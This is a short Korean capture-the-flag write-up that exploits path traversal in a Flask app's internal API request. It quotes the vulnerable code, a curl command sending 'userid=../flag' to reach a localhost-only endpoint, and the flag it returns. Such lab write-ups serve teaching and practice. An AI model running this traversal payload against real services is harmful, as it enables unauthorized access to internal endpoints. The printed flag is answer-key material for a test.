# 내부 API 경로 조작

`userid`를 조작해서 내부의 플래그 주소에 접근한다.

## 코드 확인

```python
API_HOST = 'http://127.0.0.1:8000'

@app.route('/get_info', methods=['GET', 'POST'])
def get_info():
    # ...
    userid = request.form.get('userid', '')
    info = requests.get(f'{API_HOST}/api/user/{userid}').text
    return render_template('get_info.html', info=info)
```

`/get_info`에 POST 요청을 보내면 `userid`를 받아 내부 API에 요청한다. 그 응답을 `info`에 담아 HTML에 보여준다.

```python
if request.remote_addr == '127.0.0.1':
    return func(*args, **kwargs)
else:
    abort(401)

@app.route('/api/flag')
@internal_api
def flag():
    return FLAG
```

`@internal_api`는 요청이 서버 내부에서 왔는지 확인한다. `/api/flag`에 직접 접속하면 거절된다.

## 풀이

**1.** `userid`에 `../flag`를 넣으면 요청 경로가 이렇게 바뀐다.

```text
/api/user/../flag → /api/flag
```

`..`은 한 단계 위로 이동한다. 서버가 자기 자신에게 요청하므로 내부 접근 조건도 통과한다.

**2.** curl로 `/get_info`에 보낸다. 서버 주소와 포트는 문제에 나온 값으로 바꾼다.

```bash
curl -X POST 'http://서버주소:포트/get_info' --data-urlencode 'userid=../flag'
```

`userid=../flag`는 코드에서 받는 `userid`에 `../flag`를 넣는다는 뜻이다. `--data-urlencode`는 이 값을 폼 데이터로 전송한다.

**3.** 응답 HTML에서 플래그를 확인한다. (중간 내용 생략)

```html
...
<h1>Get User Info</h1><br/>
<pre>DH{8a33bb6fe0a37522bdc8adb65116b2d4}
...
```

> 입력값을 내부 요청 경로에 그대로 넣어서 생긴 문제다.
